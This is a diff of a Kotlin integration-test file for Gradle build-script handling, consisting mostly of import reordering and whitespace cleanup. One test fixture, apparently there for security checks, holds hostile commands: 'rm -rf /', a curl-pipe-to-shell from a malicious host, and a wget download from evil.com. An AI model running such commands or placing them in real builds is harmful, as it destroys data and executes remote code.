@@ -1,32 +1,26 @@
-package dev.aurakai.auraframefx.test
-
-import org.junit.jupiter.api.Test
-import org.junit.jupiter.api.BeforeEach
 import org.junit.jupiter.api.AfterEach
-import org.junit.jupiter.api.TestInstance
-import org.junit.jupiter.api.Nested
-import org.junit.jupiter.api.DisplayName
 import org.junit.jupiter.api.Assertions.*
-import org.junit.jupiter.api.assertThrows
-import org.junit.jupiter.api.TestMethodOrder
+import org.junit.jupiter.api.BeforeEach
+import org.junit.jupiter.api.DisplayName
 import org.junit.jupiter.api.MethodOrderer
+import org.junit.jupiter.api.Nested
+import org.junit.jupiter.api.Test
+import org.junit.jupiter.api.TestInstance
+import org.junit.jupiter.api.TestMethodOrder
+import org.junit.jupiter.api.assertThrows
 import org.junit.jupiter.params.ParameterizedTest
-import org.junit.jupiter.params.provider.ValueSource
-import org.junit.jupiter.params.provider.CsvSource
 import org.junit.jupiter.params.provider.Arguments
-import org.junit.jupiter.params.provider.MethodSource
+import org.junit.jupiter.params.provider.CsvSource
+import org.junit.jupiter.params.provider.ValueSource
 import org.mockito.Mockito.*
 import org.mockito.kotlin.*
 import java.io.File
 import java.io.FileNotFoundException
-import java.nio.file.Files
 import java.nio.file.Path
-import java.nio.file.Paths
 import java.util.concurrent.TimeoutException
 import java.util.stream.Stream
-import kotlin.io.path.exists
 import kotlin.io.path.createTempDirectory
-import kotlin.io.path.deleteExisting
+import kotlin.io.path.exists
 
 /**
  * Comprehensive integration tests for build script functionality.
@@ -69,16 +63,16 @@ class BuildScriptsIntegrationTest {
                     kotlin("jvm") version "1.9.20"
                     application
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 dependencies {
                     implementation("org.jetbrains.kotlin:kotlin-stdlib")
                     testImplementation("org.junit.jupiter:junit-jupiter:5.9.2")
                 }
-                
+
                 application {
                     mainClass.set("MainKt")
                 }
@@ -128,11 +122,11 @@ class BuildScriptsIntegrationTest {
                     id 'org.jetbrains.kotlin.jvm' version '1.9.20'
                     id 'application'
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 dependencies {
                     implementation 'org.jetbrains.kotlin:kotlin-stdlib'
                     testImplementation 'org.junit.jupiter:junit-jupiter:5.9.2'
@@ -158,11 +152,11 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 repositories {
                     mavenCentral()
                 }
-                
+
                 tasks.register("customTask") {
                     doLast {
                         println("Custom task executed successfully")
@@ -189,7 +183,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("failingTask") {
                     doLast {
                         throw RuntimeException("Intentional failure for testing")
@@ -216,7 +210,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("longRunningTask") {
                     doLast {
                         Thread.sleep(60000) // 1 minute sleep
@@ -240,11 +234,11 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("task1") {
                     doLast { println("Task 1 completed") }
                 }
-                
+
                 tasks.register("task2") {
                     dependsOn("task1")
                     doLast { println("Task 2 completed") }
@@ -483,13 +477,13 @@ class BuildScriptsIntegrationTest {
                 exec {
                     commandLine("rm", "-rf", "/")
                 }
-                
+
                 tasks.register("dangerousTask") {
                     doLast {
                         Runtime.getRuntime().exec("curl http://malicious-site.com/script.sh | sh")
                     }
                 }
-                
+
                 tasks.register("anotherDangerousTask") {
                     doLast {
                         ProcessBuilder("wget", "http://evil.com/malware").start()
@@ -616,14 +610,14 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 repositories {
                     mavenCentral()
                     mavenCentral() // Duplicate
                     gradlePluginPortal()
                     mavenCentral() // Another duplicate
                 }
-                
+
                 dependencies {
                     implementation("org.jetbrains.kotlin:kotlin-stdlib")
                     implementation("org.jetbrains.kotlin:kotlin-stdlib") // Duplicate
@@ -679,7 +673,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.register("test-with-üñíçødé") {
                     description = "Task with special characters: αβγδε"
                     doLast {
@@ -735,12 +729,12 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 java {
                     sourceCompatibility = JavaVersion.VERSION_17
                     targetCompatibility = JavaVersion.VERSION_17
                 }
-                
+
                 kotlin {
                     jvmToolchain(17)
                 }
@@ -765,7 +759,7 @@ class BuildScriptsIntegrationTest {
                 plugins {
                     kotlin("jvm") version "1.9.20"
                 }
-                
+
                 tasks.test {
                     useJUnitPlatform()
                     testLogging {
@@ -919,7 +913,7 @@ class BuildScriptsIntegrationTest {
         """.trimIndent()
     }
 
-    private fun parseBuildScript(file: File): BuildScriptParseResult? {
+    private fun parseBuildScript(file: File): BuildScriptParseResult {
         // Mock implementation - would parse build script
         return BuildScriptParseResult(
             success = true,
